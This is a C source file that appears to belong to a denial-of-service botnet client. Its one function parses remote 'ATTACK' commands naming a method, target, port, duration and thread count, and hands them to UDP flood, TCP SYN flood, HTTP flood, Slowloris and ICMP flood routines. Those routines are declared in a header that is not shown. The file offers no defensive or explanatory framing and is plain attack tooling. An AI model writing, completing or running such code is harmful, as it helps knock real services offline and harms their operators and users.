#include "command_handler.h"
#include "attack_methods.h"
#include <string.h>
#include <stdio.h>

void execute_attack_command(const char* command) {
    printf("\033[1;35m[*] Executing attack command: %s\033[0m\n", command);
    
    // Parse attack command format: "ATTACK <method> <target> <port> <duration> <threads>"
    char method[20], target[256];
    int port, duration, threads;
    
    if (sscanf(command, "ATTACK %19s %255s %d %d %d", method, target, &port, &duration, &threads) == 5) {
        if (strcmp(method, "UDP") == 0) {
            start_udp_flood(target, port, duration, threads);
        } else if (strcmp(method, "TCP") == 0) {
            start_tcp_syn(target, port, duration, threads);
        } else if (strcmp(method, "HTTP") == 0) {
            start_http_flood(target, port, duration, threads);
        } else if (strcmp(method, "SLOWLORIS") == 0) {
            start_slowloris(target, port, duration, threads);
        } else if (strcmp(method, "ICMP") == 0) {
            start_icmp_flood(target, duration, threads);
        } else {
            printf("\033[1;31m[!] Unknown attack method: %s\033[0m\n", method);
        }
    } else {
        printf("\033[1;31m[!] Failed to parse attack command\033[0m\n");
    }
}
